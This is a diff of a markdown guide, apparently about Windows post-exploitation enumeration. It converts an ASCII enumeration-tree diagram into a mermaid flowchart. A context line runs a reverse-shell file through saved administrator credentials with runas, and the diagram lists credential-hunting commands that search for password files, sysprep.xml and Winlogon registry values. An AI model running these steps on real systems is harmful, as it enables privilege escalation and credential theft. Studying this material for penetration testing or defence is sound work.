@@ -302,34 +302,41 @@ C:\> runas /savecred /user:WIN-SRV-2019\Administrator "cmd.exe /c reverse_shell.
 
 ## Enumeration Methodology Summary Diagram
 
-```text
-+--------------------------------------------------------------------------+
-|                      SYSTEM ENUMERATION TREE                             |
-+--------------------------------------------------------------------------+
-                               |
-            +------------------+------------------+
-            |                  |                  |
-    +-------v-------+  +-------v-------+  +-------v-------+
-    | System Context|  | User Context  |  | Network Context|
-    +-------+-------+  +-------+-------+  +-------+-------+
-            |                  |                  |
-            |                  |                  |
-      systeminfo          whoami /all        ipconfig /all
-      wmic os             net users          netstat -ano
-      wmic qfe            net localgroup     route print
-            |                  |                  |
-            +------------------+------------------+
-                               |
-            +------------------+------------------+
-            |                  |                  |
-    +-------v-------+  +-------v-------+  +-------v-------+
-    | Running State |  | Installed Apps|  | Loot / Creds   |
-    +-------+-------+  +-------+-------+  +-------+-------+
-            |                  |                  |
-            |                  |                  |
-       tasklist /v        wmic product      dir /s /b *pass*
-       wmic process       reg query apps    sysprep.xml files
-       wmic service                         reg query Winlogon
+```mermaid
+flowchart TD
+    SET[SYSTEM ENUMERATION TREE]
+    
+    SC[System Context]
+    UC[User Context]
+    NC[Network Context]
+    
+    SET --> SC
+    SET --> UC
+    SET --> NC
+    
+    SC_cmds["systeminfo\nwmic os\nwmic qfe"]
+    UC_cmds["whoami /all\nnet users\nnet localgroup"]
+    NC_cmds["ipconfig /all\nnetstat -ano\nroute print"]
+    
+    SC --> SC_cmds
+    UC --> UC_cmds
+    NC --> NC_cmds
+    
+    RS[Running State]
+    IA[Installed Apps]
+    LC[Loot / Creds]
+    
+    SC_cmds --> RS
+    UC_cmds --> IA
+    NC_cmds --> LC
+    
+    RS_cmds["tasklist /v\nwmic process\nwmic service"]
+    IA_cmds["wmic product\nreg query apps"]
+    LC_cmds["dir /s /b *pass*\nsysprep.xml files\nreg query Winlogon"]
+    
+    RS --> RS_cmds
+    IA --> IA_cmds
+    LC --> LC_cmds
 ```
 
 ## Chaining Opportunities
